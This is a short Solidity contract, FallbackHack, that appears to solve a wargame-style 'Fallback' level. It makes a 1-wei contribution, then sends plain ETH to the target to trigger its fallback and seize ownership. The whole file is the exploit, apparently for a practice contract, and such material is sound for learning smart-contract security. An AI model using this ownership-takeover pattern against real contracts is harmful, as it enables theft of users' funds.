pragma solidity ^0.8.0;

interface FallbackInterface {
    function contribute() external payable;
    function owner() external view returns (address);
}

contract FallbackHack {
    FallbackInterface public instance;

    constructor(address _instance) {
        instance = FallbackInterface(_instance);
    }

    function setContribution() external payable {
        require(msg.value > 0, "Need to send some ETH");
        instance.contribute{value: 1}();
    }

    function takeOwnership() external payable {
        require(msg.value > 0, "Need to send some ETH");
        (bool success, ) = address(instance).call{value: 1}(new bytes(0));
        require(success, "Ownership transfer failed");
    }

    function getOwner() external view returns (address) {
        return instance.owner();
    }
}